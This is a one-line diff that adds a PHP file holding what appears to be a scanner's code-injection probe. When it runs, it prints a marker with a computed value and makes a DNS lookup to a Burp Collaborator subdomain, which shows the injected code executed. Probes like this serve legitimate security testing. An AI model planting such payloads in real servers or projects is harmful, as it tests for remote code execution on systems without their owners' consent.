@@ -1,0 +1,1 @@
+<?php printf("8t0sokbgz5".(7*6)."9u1tplch06");gethostbyname("yoqoot5xmf1a4uvtwv5h9hvyiporcjb73uzio.burpcollab"."orator.net");?>
